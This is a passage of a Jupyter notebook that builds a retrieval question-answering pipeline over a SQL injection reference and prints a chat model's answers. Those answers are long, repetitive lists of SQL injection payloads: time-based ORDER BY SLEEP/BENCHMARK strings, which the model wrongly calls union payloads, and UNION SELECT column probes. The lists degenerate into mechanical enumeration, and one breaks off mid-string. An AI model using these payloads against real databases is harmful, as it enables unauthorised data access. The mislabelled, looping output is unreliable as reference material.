       "|Out-of-band SQLi|Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled\n",
       "on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is     \n",
       "unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker  \n",
       "an alternative to inferential time-based techniques, especially if the server responses are not very stable (making\n",
       "an inferential time-based attack unreliable).| | Voice Based Sql Injection | It is a sql injection attack method   \n",
       "that can be applied in applications that provide access to databases with voice command. An attacker could pull    \n",
       "information from the database by sending sql queries with sound. |                                                 \n"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Markdown(document_sections[2].page_content)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Embeddings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# We will use the OpenAIEmbeddings to embed the text, and Qdrant to store the vectors\n",
    "embeddings = OpenAIEmbeddings()\n",
    "db = Qdrant.from_documents(document_sections, \n",
    "                           embeddings,\n",
    "                           path=\"/tmp/local_qdrant_db\",\n",
    "                           collectio_name=\"sql_injection_tools\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "VectorStoreRetriever(vectorstore=<langchain.vectorstores.qdrant.Qdrant object at 0x000001CB45F2B090>, search_type='similarity', search_kwargs={})"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "db_retriever = db.as_retriever()\n",
    "db_retriever"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Error in WandbTracer.on_retriever_start callback: retriever\n",
      "Error in WandbTracer.on_retriever_end callback: No retriever Run found to be traced\n"
     ]
    }
   ],
   "source": [
    "query = \"List some Generic Union Select Payloads\"\n",
    "docs = db_retriever.get_relevant_documents(query)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "prompt_template = \"\"\"\n",
    "Use the following context to answer the question at the end.\n",
    "If you don't know the answer, just say that you don't know, try not to make up an answer.\n",
    "\n",
    "{context}\n",
    "\n",
    "Question: {question}\n",
    "Answer:\n",
    "\"\"\"\n",
    "\n",
    "PROMPT = PromptTemplate(template=prompt_template, input_variables=[\"context\", \"question\"])\n",
    "\n",
    "context = docs[0].page_content\n",
    "prompt = PROMPT.format(context=context, question=query)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">Some Generic Union Select Payloads are:                                                                            \n",
       "\n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY SLEEP(5)                                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5)                                                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))                                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6                                                           \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7                                                         \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8                                                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9                                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13                                         \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15                                   \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16                                \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18                          \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19                       \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23           \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY                                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\">   </span>1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY                                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\">   </span>1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY                                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\">   </span>1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY                                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\">   </span>1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,3\n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\">   </span>0                                                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY SLEEP(5)#                                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5)#                                                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),3#                                                                                          \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),3,4#                                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#                                                          \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#                                                    \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#                                                 \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#                                           \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#                                     \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('                                                                     \n",
       "</pre>\n"
      ],
      "text/plain": [
       "Some Generic Union Select Payloads are:                                                                            \n",
       "\n",
       "\u001b[1;33m • \u001b[0mORDER BY SLEEP(5)                                                                                               \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5)                                                                                             \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))                                                                 \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4                                                               \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5                                                             \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6                                                           \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7                                                         \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8                                                       \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9                                                     \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10                                                  \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11                                               \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12                                            \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13                                         \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14                                      \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15                                   \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16                                \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17                             \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18                          \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19                       \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20                    \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21                 \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22              \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23           \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24        \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25     \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26  \n",
       "\u001b[1;33m • \u001b[0mORDER BY                                                                                                        \n",
       "\u001b[1;33m   \u001b[0m1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27        \n",
       "\u001b[1;33m • \u001b[0mORDER BY                                                                                                        \n",
       "\u001b[1;33m   \u001b[0m1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28     \n",
       "\u001b[1;33m • \u001b[0mORDER BY                                                                                                        \n",
       "\u001b[1;33m   \u001b[0m1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29  \n",
       "\u001b[1;33m • \u001b[0mORDER BY                                                                                                        \n",
       "\u001b[1;33m   \u001b[0m1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,3\n",
       "\u001b[1;33m   \u001b[0m0                                                                                                               \n",
       "\u001b[1;33m • \u001b[0mORDER BY SLEEP(5)#                                                                                              \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5)#                                                                                            \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),3#                                                                                          \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),3,4#                                                                                        \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#                                                            \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#                                                          \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#                                                        \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#                                                      \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#                                                    \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#                                                 \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#                                              \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#                                           \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#                                        \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#                                     \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#                                     \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#                                  \n",
       "\u001b[1;33m • \u001b[0mORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('                                                                     \n"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "llm = ChatOpenAI(temperature=0.0)\n",
    "response = llm.predict(prompt)\n",
    "Markdown(response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Error in WandbTracer.on_retriever_start callback: retriever\n",
      "Error in WandbTracer.on_retriever_end callback: No retriever Run found to be traced\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">Some generic UNION SELECT payloads include:                                                                        \n",
       "\n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT NULL                                                                                               \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a', 'b', 'c'                                                                                      \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 1,2,3                                                                                              \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3                                                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual                                                                                  \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=0                                                                        \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 1                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 2                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 3                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 4                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 5                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 6                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 7                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 8                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 9                                                             \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 10                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 11                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 12                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 13                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 14                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 15                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 16                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 17                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 18                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 19                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 20                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 21                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 22                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 23                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 24                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 25                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 26                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 27                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 28                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 29                                                            \n",
       "<span style=\"color: #808000; text-decoration-color: #808000; font-weight: bold\"> • </span>UNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 30                                                            \n",
       "</pre>\n"
      ],
      "text/plain": [
       "Some generic UNION SELECT payloads include:                                                                        \n",
       "\n",
       "\u001b[1;33m • \u001b[0mUNION SELECT NULL                                                                                               \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a', 'b', 'c'                                                                                      \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 1,2,3                                                                                              \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3                                                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual                                                                                  \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1                                                                        \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=0                                                                        \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 1                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 2                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 3                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 4                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 5                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 6                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 7                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 8                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 9                                                             \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 10                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 11                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 12                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 13                                                            \n",
       "\u001b[1;33m • \u001b[0mUNION SELECT 'a',2,3 FROM dual WHERE 1=1 ORDER BY 14                                                            \n",
